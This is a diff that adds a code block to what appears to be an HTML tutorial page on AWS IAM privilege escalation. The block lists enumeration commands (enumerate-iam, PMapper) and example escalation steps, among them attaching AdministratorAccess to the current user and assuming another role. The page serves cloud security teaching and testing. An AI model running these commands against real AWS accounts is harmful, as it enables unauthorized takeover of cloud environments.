@@ -120,6 +120,12 @@ aws iam get-account-authorization-details   # the whole IAM picture (if allowed)
             <tr><td><code>sts:AssumeRole</code> with a permissive trust policy</td><td>Assume a role you were not meant to.</td></tr>
           </tbody>
         </table>
+        <pre><code># map which of these you actually hold, then walk the edge
+enumerate-iam --access-key &lt;AK&gt; --secret-key &lt;SK&gt;
+pmapper graph create ; pmapper query 'preset privesc &lt;me&gt;'   # finds the chain for you
+# example edges:
+aws iam attach-user-policy --user-name me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws sts assume-role --role-arn arn:aws:iam::&lt;acct&gt;:role/&lt;role&gt; --role-session-name s</code></pre>
         <blockquote>
           The mental model is a graph of <strong>who can assume / pass / modify
           whom</strong> &mdash; the AWS analogue of a BloodHound path. Tools map these
